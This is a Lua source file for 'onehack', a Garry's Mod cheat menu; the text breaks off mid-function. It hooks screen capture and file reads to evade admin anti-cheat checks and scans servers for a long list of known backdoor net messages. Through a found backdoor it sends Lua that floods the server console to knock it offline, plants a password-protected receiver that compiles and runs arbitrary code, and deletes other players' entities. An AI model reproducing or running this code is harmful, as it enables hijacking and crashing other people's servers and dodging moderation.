local onehack = onehack or {}
onehack.options = onehack.options or {}
onehack.Vars = {}
onehack.Vars['ASR'] = true -- ANTISCREENGRAB
onehack.Vars['ASF'] = false -- ANTIFILESTEAL
onehack.Vars['ESP'] = false
onehack.Vars['FCAM'] = false -- FREECAM
onehack.Vars['ESP_NAME'] = false
onehack.Vars['ESP_WEAPON'] = false
onehack.Vars['ESP_BOX'] = false
onehack.Vars['ESP_HPBOX'] = false
onehack.Vars['WEAPON_LIST3D'] = false
onehack.Vars['keypad_jiw'] = false
onehack.CamSpeed_Normal = 2
onehack.CamSpeed_Fast = 7
onehack.CamSpeed_Slow = 0.5
onehack.SpectatePlayer = nil
onehack.StartCamPos = LocalPlayer():EyePos() or Vector(0,0,0)
onehack.StartCamAng = LocalPlayer():EyeAngles() or Angle(0,0,0)
onehack.options.esp = onehack.options.esp or {}
onehack.theme = onehack.theme or {}
onehack.BackDoors = {"m9k_rvac","YukiBackdoor","The_DankWhy","loki","stil","thanos","Limon","OBF::JH::HAX","HitOrMiss<3Luda","https://i.imgur.com/Gf6hLMl.png","Net.Start","insid3","ABCNet","FoerHack","display_messagesfh","_Reading_darkrp","nx_noiwex","FPSBOOST","nxsuper","Sandbox_ArmDupe","Sbox_darkrp","Sbox_itemstore","Ulib_Message","ULogs_Info","ALTERED_CARB0N","ITEM","R8","fix","Fix_Keypads","PoliceJoin","Remove_Exploiters","noclipcloakaesp_chat_text","_Defqon","_CAC_ReadMemory","nostrip","nocheat","LickMeOut","JSQuery.Data(Post(false))","ULX_QUERY2","ULXQUERY2","MoonMan","Im_SOCool","Sandbox_GayParty","DarkRP_UTF8","oldNetReadData","memeDoor","BackDoor","OdiumBackDoor","SessionBackdoor","DarkRP_AdminWeapons","cucked","NoNerks","kek","ZimbaBackDoor","something","random","strip0","fellosnake","enablevac","c","Detoured q","Þà?D)◘","idk","r8helper","killserver","fuckserver","cvaraccess","rcon","rconadmin","web","jesuslebg","zilnix","ÃžÃ ?D)â—","ÃžÃ ?D)","SparksLeBg","disablebackdoor","slua2","slua","CraftSomething","WriteQuery","thefrenchenculer","pplay_sendtable"," .. v.NetWork .. ","slua6","jeveuttonrconleul","kill","DefqonBackdoor","DarkRP_AllDoorDatas","0101.1","awarn_remove","PlayerItemPickUp","_Infinity","Infinity","InfinityBackdoor","_Infinity_Meme_","arivia","ULogs_B","_Warns","_cac_","striphelper","_vliss"," Ў є ѕ ї ёСЂ ѕ І ° Ѕ ѕ  І  ±СѓС„ µСЂ  ѕ ± ј µ Ѕ °.","_KekTcf","DataMinerType","_blacksmurf","blacksmurfBackdoor","_Raze","m9k_explosionradius","m9k_explosive","m9k_addons","rcivluz","SENDTEST","_clientcvars","_main","stream","waoz","thereaperishere","bdsm","ZernaxBackdoor","UKT_MOMOS","anticrash","audisquad_lua","dontforget","noprop","thereaper","0x13","Child","!Cac","azkaw","BOOST_FPS","childexploit","ULX_ANTI_BACKDOOR","FADMIN_ANTICRASH","ULX_QUERY_TEST2","GMOD_NETDBG","netlib_debug","NoOdium_ReadPing","Sbox_gm_attackofnullday_key","Sbox_Message","idk","aze46aez67z67z64dcv4bt","nolag","changename","music","xenoexistscl","fourhead","echangeinfo","Þ� ?D)◘","elfamosabackdoormdr","stoppk","reaper","Abcdefgh","pjHabrp9EY","gag","_Battleye_Meme_","GaySploitBackdoor","_GaySploit","Bilboard.adverts:Spawn(false)","BazZziliuS","CacAntiCheat","noclipcloakaWH_chat_text","WepSwitch_DisableAllSwitch","PlayerCheck","backdoorattackdefense_superadminsettrue","loona","kIRIUS"}
onehack.foundedbacks = {}
onehack.antiskabad = {"Sandbox_ArmDupe","Sbox_darkrp","Sbox_itemstore","Ulib_Message","ULogs_Info","ITEM","R8","fix","Fix_Keypads","Remove_Exploiters","noclipcloakaesp_chat_text","_Defqon","_CAC_ReadMemory","nocheat","LickMeOut","ULX_QUERY2","ULXQUERY2","MoonMan","Im_SOCool","Sandbox_GayParty","DarkRP_UTF8","oldNetReadData","memeDoor","BackDoor","OdiumBackDoor","SessionBackdoor","DarkRP_AdminWeapons","cucked","NoNerks","kek","ZimbaBackDoor","something","random","strip0","fellosnake","enablevac","idk","c","killserver","fuckserver","cvaraccess","rcon","rconadmin","web","jesuslebg","zilnix","ГћГ ?D)в—˜","disablebackdoor","kill","DefqonBackdoor"}
onehack.AllNets = {}
onehack.selectedbackdoor = "none"
onehack.version = "1.0.0"
onehack.selected_player = 0
onehack.debug = onehack.debug or {}
onehack.foundednets = {}
-- THEME SETTINGS
onehack.theme.background = Color(30,30,30,200)
onehack.theme.backgroundalt = Color(25,25,25)
onehack.theme.backgroundalt2 = Color(50,50,50)
onehack.theme.backgroundalt3 = Color(15,15,15)
onehack.theme.buttonhover = Color(255,255,255,50)
onehack.theme.chroma = Color(255,180,30)
onehack.theme.chromaalt = Color(onehack.theme.chroma.r-55,onehack.theme.chroma.g-60,onehack.theme.chroma.b-30)
-- THEME SETTINGS
onehack.memory = {
    ["hud"] = 0,
    ["logic"] = 0,
    ["aimbot"] = 0,
}
-- OPTIONS
onehack.options.esp.enable = false
onehack.options.esp.showname = false
onehack.options.esp.showbox = false
onehack.options.esp.showgroup = false
onehack.options.esp.showweapn = false
onehack.options.esp.boxtype = 0
onehack.options.esp.boxcolor = Color(255,255,255)
onehack.options.esp.namecolor = Color(255,255,255)
onehack.options.esp.weaponcolor = Color(255,255,255)
onehack.options.esp.groupcolor = Color(255,255,255)
 
onehack.options.esp.enable_entity = false
onehack.options.esp.showname_entity = false
onehack.options.esp.showbox_entity = false
onehack.options.esp.boxtype_entity = 0
onehack.options.esp.boxcolor_entity = Color(255,255,255)
onehack.options.esp.namecolor_entity = Color(255,255,255)
-- OPTIONS
onehack.selectedpanel = nil
onehack.selectedpanel_id = 0
onehack.timestamp = os.time()
onehack.timettring = os.date( "[%H:%M:%S] " , timestamp )
function onehack.DebugLog( str, col )
	table.insert(onehack.debug, {onehack.timettring..str, col})
	if #onehack.debug > 200 then
	    table.remove( onehack.debug, 1 )
	end
end
 
local Tuner = nil
function onehack.NetStart( str )
	--print("[DEBUG] Started net: "..str)
	if onehack.selectedbackdoor == "none" then return false end
	return net.Start( str )
end
 
 
local ss = false
local renderv = render.RenderView
local renderc = render.Clear
local rendercap = render.Capture
local vguiworldpanel = vgui.GetWorldPanel
 
 
function onehack.screengrab()
	if ss then return end
	ss = true
 
	renderc( 0, 0, 0, 255, true, true )
	renderv( {
		origin = LocalPlayer():EyePos(),
		angles = LocalPlayer():EyeAngles(),
		x = 0,
		y = 0,
		w = ScrW(),
		h = ScrH(),
		dopostprocess = true,
		drawhud = true,
		drawmonitors = true,
		drawviewmodel = true
	} )
 
	local vguishits = vguiworldpanel()
 
	if IsValid( vguishits ) then
		vguishits:SetPaintedManually( true )
	end
 
	timer.Simple( 0.1, function()
		vguiworldpanel():SetPaintedManually( false )
		ss = false
	end)
end
 
render.Capture = function(data)
	if onehack.Vars['ASR'] then
		onehack.screengrab()
		onehack.DebugLog( "ScreenGrab started: PROTECTED!", Color(0,255,0) )
	else
		onehack.DebugLog( "ScreenGrab started: NOT PROTECTED!", Color(255,0,0) )
	end
	local cap = rendercap( data )
	return cap
end
 
local oldRead = file.Read
function file.Read( fn, path )
	if string.find(path, "DATA") or string.find(path, "lua") and onehack.Vars['ASF'] then
		onehack.DebugLog( "File readed: "..path, Color(0,255,0) )
		return "vzlom_zhopi()"
	else
		onehack.DebugLog( "File readed: "..path, Color(255,0,0) )
	    return oldRead( fn, path )
	end
end
 
 
function onehack.NetWriteBeat( str )
	local netwretbit = net.WriteBit
	return netwretbit( str )
end
 
function onehack.SendToServak()
	if onehack.selectedbackdoor == "none" then return false end
	local netsendsrviar = net.SendToServer
	return netsendsrviar()
end
 
function onehack.NetWireString( str )
	local netwitestring = net.WriteString
	return netwitestring( str )
end
 
function onehack.NetWireInt( str1,str2 )
	local netwitestring = net.WriteInt
	return netwitestring( str1,str2 )
end
 
function onehack.ValidNetStriABCD( str )
	local status, error = pcall( s, str )
	return status
end
 
function onehack.MouseInArea(framesag,minx,miny,maxx,maxy)
    local PosX,PosY = framesag:GetPos()
    local posx,posy = gui.MousePos();
    return ((posx >= minx && posx <= maxx) && (posy >= miny && posy <= maxy));
end
 
function onehack.RandomString(len)
    if len == nil then
        len = math.random(20,100)
    end
    local ret = ""
    for i=1,len do
        ret = ret..string.char(math.random(33,126))
    end
    return ret
end
 
function onehack.DrawOutLinedRect(x,y,w,h,color)
    surface.SetDrawColor( color )
    surface.DrawOutlinedRect( x, y, w, h )
    surface.SetDrawColor( Color(255,255,255,255) )
end
function onehack.DrawRect(x,y,w,h,color)
    surface.SetDrawColor( color )
    surface.DrawRect( x, y, w, h )
    surface.SetDrawColor( Color(255,255,255,255) )
end
function onehack.Drawline(x,y,x2,y2,color)
    surface.SetDrawColor(color)
    surface.DrawLine(x,y,x2,y2)
    surface.SetDrawColor( Color(255,255,255,255) )
end
local SpecModeFrame
function onehack.SpectateMode()
	if IsValid(SpecModeFrame) then return end
	onehack.Vars['SCAM'] = true
	SpecModeFrame = vgui.Create("DFrame")
	SpecModeFrame:SetSize(300,400)
	SpecModeFrame:SetPos(ScrW()-300,0)
	SpecModeFrame:SetTitle("")
	SpecModeFrame:ShowCloseButton(false)
	function SpecModeFrame:Paint(w,h)
		draw.RoundedBox(0,0,0,w,h,onehack.theme.background)
		draw.RoundedBox(0,6,6,w-12,h-12,onehack.theme.backgroundalt2)
		draw.RoundedBox(0,7,7,w-14,h-14,onehack.theme.backgroundalt)
		draw.RoundedBox(0,7,7,w-14,2,onehack.theme.chromaalt)
		draw.RoundedBox(0,7,7,w-14,1,onehack.theme.chroma)
		draw.SimpleText("Spectator Mode","DermaDefault",w/2,20,Color(150,150,150),1,1)
		local weapon = "NONE"
		local hps = "NONE"
		local ars = "NONE"
		if IsValid(onehack.SpectatePlayer) and onehack.SpectatePlayer:IsPlayer() then
			if IsValid(onehack.SpectatePlayer:GetActiveWeapon()) then
				weapon = onehack.SpectatePlayer:GetActiveWeapon():GetClass()
			end
			hps = onehack.SpectatePlayer:Health()
			ars = onehack.SpectatePlayer:Armor()
		end
		draw.SimpleText("Weapon: "..weapon,"DermaDefault",10,h-60,Color(150,150,150),0,1)
		draw.SimpleText("HP/AR: "..hps.."/"..ars,"DermaDefault",12,h-45,Color(150,150,150),0,1)
	end
 
	local SpecPlayerList = vgui.Create( "DScrollPanel", SpecModeFrame )
	SpecPlayerList:Dock(TOP)
	SpecPlayerList:DockMargin(2,2, 2, 2)
	SpecPlayerList:SetTall(300)
	function SpecPlayerList:Paint( w,h )
		draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
		draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt3)
	end
	SpecPlayerList.VBar:SetWidth(1)
	SpecPlayerList:GetVBar().Paint = function() draw.RoundedBox(0, 0, 0, SpecPlayerList:GetVBar():GetWide(), SpecPlayerList:GetVBar():GetTall(), Color(255, 255, 255, 0)) end
	SpecPlayerList:GetVBar().btnUp.Paint = function() draw.RoundedBox(0, 0, 0, SpecPlayerList:GetVBar().btnUp:GetWide(), SpecPlayerList:GetVBar().btnUp:GetTall(), Color(0,0,0,0)) end
	SpecPlayerList:GetVBar().btnDown.Paint = function() draw.RoundedBox(0, 0, 0, SpecPlayerList:GetVBar().btnDown:GetWide(), SpecPlayerList:GetVBar().btnDown:GetTall(), Color(0,0,0,0)) end
	SpecPlayerList:GetVBar().btnGrip.Paint = function() draw.RoundedBox(0, 0, 0, SpecPlayerList:GetVBar().btnGrip:GetWide(), SpecPlayerList:GetVBar().btnGrip:GetTall(), onehack.theme.chroma) end
 
	for k,v in pairs(player.GetAll()) do
		if IsValid(v) then
			local onehack_player_button = SpecPlayerList:Add( "DButton" )
			onehack_player_button:SetText( "" )
			onehack_player_button:Dock( TOP )
			onehack_player_button:DockMargin( 2, 2, 2, 0 )
			onehack_player_button.Paint = function( _, w, h )
				if onehack_player_button:IsHovered() then
					draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
					draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt3)
				else
					draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
					draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt)
				end
				if onehack.SpectatePlayer == v then
					if IsValid(v) and v:IsPlayer() then
						draw.SimpleText("> "..v:Name() or "NILL".." <","DermaDefault",w/2,h/2,onehack.theme.chroma,1,1)
					end
				else
					if IsValid(v) and v:IsPlayer() then
						draw.SimpleText(v:Name() or "NILL","DermaDefault",w/2,h/2,Color(255,255,255),1,1)
					end
				end
			end
			function onehack_player_button:DoClick()
				if onehack.SpectatePlayer == v then
					if IsValid(onehack.SpectatePlayer) and onehack.SpectatePlayer:IsPlayer() then
						onehack.SpectatePlayer:SetNoDraw( false )
					end
					onehack.SpectatePlayer = nil
				else
					if IsValid(onehack.SpectatePlayer) and onehack.SpectatePlayer:IsPlayer() then
						onehack.SpectatePlayer:SetNoDraw( false )
					end
					onehack.SpectatePlayer = v
					v:SetNoDraw( true )
				end
			end
		end
	end
 
	for k, v in pairs(ents.GetAll()) do
		if v:GetClass() == "gmod_cameraprop" then
			local onehack_camera_button = SpecPlayerList:Add( "DButton" )
			onehack_camera_button:SetText( "" )
			onehack_camera_button:Dock( TOP )
			onehack_camera_button:DockMargin( 2, 2, 2, 0 )
			onehack_camera_button.Paint = function( _, w, h )
				if onehack_camera_button:IsHovered() then
					draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
					draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt3)
				else
					draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
					draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt)
					end
					if onehack.SpectatePlayer == v then
					draw.SimpleText("> CAMERA "..k.."# <","DermaDefault",w/2,h/2,onehack.theme.chroma,1,1)
				else
					draw.SimpleText("CAMERA "..k.."#","DermaDefault",w/2,h/2,Color(255,255,255),1,1)
				end
			end
			function onehack_camera_button:DoClick()
				if onehack.SpectatePlayer == v then
					if IsValid(onehack.SpectatePlayer) and onehack.SpectatePlayer:IsPlayer() then
						onehack.SpectatePlayer:SetNoDraw( false )
					end
					onehack.SpectatePlayer = nil
				else
					if IsValid(onehack.SpectatePlayer) and onehack.SpectatePlayer:IsPlayer() then
						onehack.SpectatePlayer:SetNoDraw( false )
					end
					onehack.SpectatePlayer = v
					if v:IsValid() then
						v:SetNoDraw( true )
					end
				end
			end
		end
	end
 
	local CloseSpec = SpecModeFrame:Add( "DButton" )
	CloseSpec:SetTextColor( Color( 200, 200, 200 ) )
	CloseSpec:SetText( "" )
	CloseSpec:Dock(BOTTOM)
	CloseSpec:DockMargin(1,2, 1, 0)
	function CloseSpec:Paint( w,h )
		if CloseSpec:IsHovered() then
			draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
			draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt3)
		else
			draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
			draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt)
		   end
		draw.SimpleText("Exit","DermaDefault",w/2,h/2,Color(255,255,255),1,1)
	end
 
	CloseSpec.DoClick = function()
		onehack.Vars['SCAM'] = false
		SpecModeFrame:Remove()
	end
end
 
function onehack.scan()
	for i = 0, 2^16 do
	    local str = util.NetworkIDToString( i )
	    if ( str && str != "" ) then
	        if( !net.Receivers[str] ) then
				table.insert( onehack.AllNets, str )
	        end
	    end
	end
	for i = 0, 2^16 do
	    local str = util.NetworkIDToString( i )
	    if ( str && str != "" ) then
			if( !net.Receivers[str] ) then
				table.insert(onehack.foundednets,str)
	        	if table.HasValue( onehack.BackDoors, str ) or string.find( string.lower(str), "backdoor" ) or string.find( string.lower(str), "exploit" ) or string.find( string.lower(str), "http" ) then
	        		if not table.HasValue( onehack.foundedbacks, str ) then
	        			if not table.HasValue(onehack.antiskabad,str) then
							table.insert( onehack.foundedbacks, str )
							onehack.DebugLog( "Backdoor found: "..str, Color(116,41,162) )
						else
							table.insert( onehack.foundedbacks, str )
							onehack.DebugLog( "Backdoor found: "..str.." (Внимание данный бэкду  ве оятнее фейк!)", Color(116,41,162) )
						end
					end
				end
	        end
	    end
	end
end
 
function onehack.StripWeapon( ent )
	if not ent:IsValid() then return end
	if ent.NextNuke and ent.NextNuke > CurTime() then return end
	onehack.NetStart("properties")
	net.WriteString("remove")
	net.WriteEntity( ent )
	net.SendToServer()
	ent.NextNuke = CurTime() + 0.5
end
function onehack.StripAllWeapons( tab )
	for k, v in pairs( tab ) do
	if not v:IsValid() then continue end
		if v.NextNuke and v.NextNuke > CurTime() then continue end
		onehack.NetStart("properties")
		net.WriteString("remove")
		net.WriteEntity( v )
		net.SendToServer()
	end
end
onehack.scan()
function MainFunc()
	actived = true
	framesag = vgui.Create("DFrame")
	framesag:SetSize(600,400)
	framesag:Center()
	framesag:MakePopup()
	framesag:SetTitle("")
	framesag:ShowCloseButton(false)
	function framesag:Init()
		framesag.startTime = SysTime()
	end
	function framesag:Paint(w,h)
		Derma_DrawBackgroundBlur( framesag, framesag.startTime )
		draw.RoundedBox(0,0,0,w,h,onehack.theme.background)
		draw.RoundedBox(0,6,6,w-12,h-12,onehack.theme.backgroundalt2)
		draw.RoundedBox(0,7,7,w-14,h-14,onehack.theme.backgroundalt)
		draw.RoundedBox(0,7,7,w-14,2,onehack.theme.chromaalt)
		draw.RoundedBox(0,7,7,w-14,1,onehack.theme.chroma)
	end
 
	ButtonList = vgui.Create( "DScrollPanel", framesag )
	ButtonList:SetPos(6,9)
	ButtonList:SetSize(120,400-15)
	function ButtonList:Paint(w,h)
		draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
		draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt3)
	end
 
	function PanelAddButton( text, menuses,id) -- Кнопка в левое меню
		local MenuBut = ButtonList:Add( "DButton" )
		MenuBut:SetTextColor( Color( 200, 200, 200 ) )
		MenuBut:SetText("")
		MenuBut:SetHeight(30)
		MenuBut:Dock( TOP )
		MenuBut:DockMargin( 0, 0, 0, 0 )
		function MenuBut:Paint( w,h )
	    	if MenuBut:IsHovered() then
				draw.RoundedBox(0,1,0,w-2,h,onehack.theme.backgroundalt2)
				draw.RoundedBox(0,1,0,w-2,h-1,onehack.theme.backgroundalt3)
			else
				draw.RoundedBox(0,1,0,w-2,h,onehack.theme.backgroundalt2)
				draw.RoundedBox(0,1,0,w-2,h-1,onehack.theme.backgroundalt)
		   	end
		   	if onehack.selectedpanel_id == id then
		   		draw.SimpleText(text,"DermaDefault",w/2,h/2,onehack.theme.chroma,1,1)
		   	else
		   		draw.SimpleText(text,"DermaDefault",w/2,h/2,Color(255,255,255),1,1)
		   	end
		end
 
		MenuBut.DoClick = function()
			if onehack.selectedpanel == menuses then return end
			if onehack.selectedpanel != menuses then
				menuses()
			end	
		end
	end
 
	function onehack.AddFunction( text , lolol, dawcf, func ) -- Кнопка в левое меню
		local MenuBut2 = onehack.backlistt_functionsss_list:Add( "DButton" )
		MenuBut2:SetTextColor( Color( 200, 200, 200 ) )
		MenuBut2:SetText( "" )
		MenuBut2:Dock( TOP )
		MenuBut2:DockMargin( 0, 0, 0, 1 )
		function MenuBut2:Paint( w,h )
	    	if MenuBut2:IsHovered() then
				draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
				draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt3)
			else
				draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
				draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt)
		   	end
			draw.SimpleText(text,"DermaDefault",w/2,h/2,Color(255,255,255),1,1)
		end
 
		MenuBut2.DoClick = function()
			func()
		end
	end
	function onehack.AddExploit( text , func ) -- Кнопка в левое меню
		local MenuBut2 = onehack.exploitsList:Add( "DButton" )
		MenuBut2:SetTextColor( Color( 200, 200, 200 ) )
		MenuBut2:SetText( "" )
		MenuBut2:Dock( TOP )
		MenuBut2:DockMargin( 0, 0, 0, 1 )
		function MenuBut2:Paint( w,h )
	    	if MenuBut2:IsHovered() then
				draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
				draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt3)
			else
				draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
				draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt)
		   	end
			draw.SimpleText(text,"DermaDefault",w/2,h/2,Color(255,255,255),1,1)
		end
 
		MenuBut2.DoClick = function()
			func()
		end
	end
	function onehackdooropt() -- onehack.backlistt_functionsss_list
		onehackdooropt = vgui.Create( "DPanel" , framesag )
		onehackdooropt:SetPos( 126, 9 )
		onehackdooropt:SetSize( framesag:GetWide()-120-13, framesag:GetTall()-16 )
		function onehackdooropt:Paint( w, h )
			draw.RoundedBox( 0, 0, 0, w, h, onehack.theme.backgroundalt )
		end
 
		onehack.backlistt = vgui.Create( "DComboBox", onehackdooropt )
		onehack.backlistt:SetPos( onehackdooropt:GetWide()-155, 5 )
		onehack.backlistt:SetSize( 150, 25 )
		onehack.backlistt:SetValue( "Select Backdoor" )
		for _,v in pairs(onehack.foundedbacks) do
			onehack.backlistt:AddChoice( v )
		end
		onehack.backlistt.OnSelect = function( self, index, value )
			onehack.selectedbackdoor = value
		end
		onehack.backlistt.Paint = function( _, w, h )
			draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
			draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt)
		end
 
		onehack.backlistt_check_button = vgui.Create( "DButton", onehackdooropt )
		onehack.backlistt_check_button:SetPos( 5, 5 )
		onehack.backlistt_check_button:SetSize( 150, 25 )
		onehack.backlistt_check_button:SetText( "" )
		onehack.backlistt_check_button.Paint = function( _, w, h )
	    	if onehack.backlistt_check_button:IsHovered() then
				draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
				draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt3)
			else
				draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
				draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt)
		   	end
			draw.SimpleText("Check backdoor","DermaDefault",w/2,h/2,Color(255,255,255),1,1)
		end
		function onehack.backlistt_check_button:DoClick()
			onehack.NetStart( onehack.selectedbackdoor )
			onehack.NetWireString([[
 
	            local id = ]] .. LocalPlayer():UserID() .. [[
 
	            Player( id ):SendLua("ABCNotify(\" аботает!\", 4)")
 
	        ]])
			net.WriteBit(1)
			onehack.SendToServak()
		end
 
		onehack.backlistt_crashserver = vgui.Create( "DButton", onehackdooropt )
		onehack.backlistt_crashserver:SetPos( onehackdooropt:GetWide()-155, 35 )
		onehack.backlistt_crashserver:SetSize( 150, 25 )
		onehack.backlistt_crashserver:SetText( "" )
		onehack.backlistt_crashserver.Paint = function( _, w, h )
	    	if onehack.backlistt_crashserver:IsHovered() then
				draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
				draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt3)
			else
				draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
				draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt)
		   	end
			draw.SimpleText("Off server","DermaDefault",w/2,h/2,Color(255,255,255),1,1)
		end
		function onehack.backlistt_crashserver:DoClick()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString( "timer.Create( \"spamlolk\", 0, 0, function() for i = 1, 1000000 do MsgC(Color(math.random(255), math.random(255), math.random(255)), \"� \") end end)" )
			net.WriteBit(1)
			onehack.SendToServak()
		end
 
		onehack.backlistt_pach_button = vgui.Create( "DButton", onehackdooropt )
		onehack.backlistt_pach_button:SetPos( 160, 5 )
		onehack.backlistt_pach_button:SetSize( 147, 25 )
		onehack.backlistt_pach_button:SetText( "" )
		onehack.backlistt_pach_button.Paint = function( _, w, h )
	    	if onehack.backlistt_pach_button:IsHovered() then
				draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
				draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt3)
			else
				draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
				draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt)
		   	end
			draw.SimpleText("Detect pach","DermaDefault",w/2,h/2,Color(255,255,255),1,1)
		end
		function onehack.backlistt_pach_button:DoClick()
			onehack.NetStart( onehack.selectedbackdoor )
			onehack.NetWireString([[
	       			local id = ]] .. LocalPlayer():UserID() .. [[
 
					        for k ,v in SortedPairs( net.Receivers, false ) do
					        	if k ==  string.lower( "]]..onehack.selectedbackdoor..[[") then
						        		Player( id ):ChatPrint("Path: "..debug.getinfo( v )["short_src"] )
						    	end
						    end
	        ]])
			net.WriteBit(1)
			onehack.SendToServak()
		end
 
		onehack.backlistt_fix_button = vgui.Create( "DButton", onehackdooropt )
		onehack.backlistt_fix_button:SetPos( 160, 35 )
		onehack.backlistt_fix_button:SetSize( 147, 25 )
		onehack.backlistt_fix_button:SetText( "" )
		onehack.backlistt_fix_button.Paint = function( _, w, h )
	    	if onehack.backlistt_fix_button:IsHovered() then
				draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
				draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt3)
			else
				draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
				draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt)
		   	end
			draw.SimpleText("Fix backdoor","DermaDefault",w/2,h/2,Color(255,255,255),1,1)
		end
		function onehack.backlistt_fix_button:DoClick()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString( [[
				net.Receive(]]..onehack.selectedbackdoor..[[,function()
					print("У ВАС ЕСТЬ BACKDOOR!!!!!!!!!!!!!!!!!!!!!!!!")
			    end)
			]] )
			net.WriteBit(1)
			onehack.SendToServak()
		end
 
		onehack.backlistt_protect_input = vgui.Create("DTextEntry", onehackdooropt)
		onehack.backlistt_protect_input:SetPos( 5, 35 )
		onehack.backlistt_protect_input:SetSize( 150, 25 )
		onehack.backlistt_protect_input:SetText( "password" )
		onehack.backlistt_protect_input.Paint = function( self, w, h )
			draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
			draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt)
			self:DrawTextEntryText(onehack.theme.chroma,onehack.theme.chroma,onehack.theme.chroma)
			--draw.SimpleText("Protect backdoor","DermaDefault",w/2,h/2,Color(255,255,255),1,1)
		end
 
		onehack.backlistt_protect_button = vgui.Create( "DButton", onehackdooropt )
		onehack.backlistt_protect_button:SetPos( 5, 59 )
		onehack.backlistt_protect_button:SetSize( 150, 31 )
		onehack.backlistt_protect_button:SetText( "" )
		onehack.backlistt_protect_button.Paint = function( _, w, h )
	    	if onehack.backlistt_protect_button:IsHovered() then
				draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
				draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt3)
			else
				draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
				draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt)
		   	end
			draw.SimpleText("Protect backdoor","DermaDefault",w/2,h/2,Color(255,255,255),1,1)
		end
		function onehack.backlistt_protect_button:DoClick()
			onehack.NetStart( onehack.selectedbackdoor )
			onehack.NetWireString([[
				net.Receive(]]..onehack.selectedbackdoor..[[,function()
					if net.ReadFloat() == "]]..onehack.backlistt_protect_input:GetValue()..[[" then
						local x = CompileString( net.ReadString(), 'LuaCmd', false )
						if isfunction( x ) then
							x()
						end
					end
			    end)
	        ]])
			net.WriteBit(1)
			onehack.SendToServak()
		end
 
		onehack.backlistt_players_list = vgui.Create( "DScrollPanel", onehackdooropt )
		onehack.backlistt_players_list:SetPos(5,114)
		onehack.backlistt_players_list:SetSize(150,264)
		function onehack.backlistt_players_list:Paint( w,h )
			draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
			draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt3)
		end
		onehack.backlistt_players_list.VBar:SetWidth(1)
		onehack.backlistt_players_list:GetVBar().Paint = function() draw.RoundedBox(0, 0, 0, onehack.backlistt_players_list:GetVBar():GetWide(), onehack.backlistt_players_list:GetVBar():GetTall(), Color(255, 255, 255, 0)) end
		onehack.backlistt_players_list:GetVBar().btnUp.Paint = function() draw.RoundedBox(0, 0, 0, onehack.backlistt_players_list:GetVBar().btnUp:GetWide(), onehack.backlistt_players_list:GetVBar().btnUp:GetTall(), Color(0,0,0,0)) end
		onehack.backlistt_players_list:GetVBar().btnDown.Paint = function() draw.RoundedBox(0, 0, 0, onehack.backlistt_players_list:GetVBar().btnDown:GetWide(), onehack.backlistt_players_list:GetVBar().btnDown:GetTall(), Color(0,0,0,0)) end
		onehack.backlistt_players_list:GetVBar().btnGrip.Paint = function() draw.RoundedBox(0, 0, 0, onehack.backlistt_players_list:GetVBar().btnGrip:GetWide(), onehack.backlistt_players_list:GetVBar().btnGrip:GetTall(), onehack.theme.chroma) end
 
		onehack.player_button_prev = vgui.Create( "DButton", onehackdooropt )
		onehack.player_button_prev:SetText( "" )
		onehack.player_button_prev:SetPos(5,95)
		onehack.player_button_prev:SetSize(150,20)
		function onehack.player_button_prev:Paint( w,h )
